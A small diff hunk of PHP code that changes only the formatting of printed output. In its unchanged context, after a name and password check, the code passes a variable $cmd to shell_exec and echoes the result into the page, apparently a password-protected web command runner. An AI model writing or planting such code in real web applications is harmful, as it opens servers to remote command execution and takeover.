@@ -42,7 +42,7 @@
                 if( $oname == $localname && $opsw==$localpsw)
                 {
                     $output = shell_exec("$cmd");
-                    echo "<p>output =【 $output 】</p>";
+                    echo "<p>output =[$output]</p>";
                 }                 
             }
 
